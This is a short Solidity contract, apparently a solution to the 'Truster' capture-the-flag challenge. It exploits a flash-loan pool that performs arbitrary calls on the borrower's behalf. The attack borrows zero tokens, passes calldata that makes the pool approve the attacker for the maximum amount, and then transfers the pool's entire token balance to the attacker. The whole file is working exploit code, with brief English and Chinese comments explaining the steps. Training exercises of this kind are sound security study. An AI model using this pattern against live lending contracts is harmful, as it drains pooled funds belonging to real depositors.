// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILenderPool {
    function flashLoan(
        uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}
    
contract TrusterAttacker {
    ILenderPool immutable pool;
    IERC20 immutable token;
    address private attacker;
    

    constructor(address _poolAddress, address _tokenAddress) {
        pool = ILenderPool(_poolAddress);
        token = IERC20(_tokenAddress);
        attacker = msg.sender;
    }

    function attack() external { 
        //let pool approve infinite token 
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2 ** 256 -1);//最大值-1  做為極大值
        pool.flashLoan(0, address(this), address(token), data);//借錢這裡為0  目的是calldata 

        //check balance and send tokens from pool to attacker   
        uint balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, balance);
    }

    
}
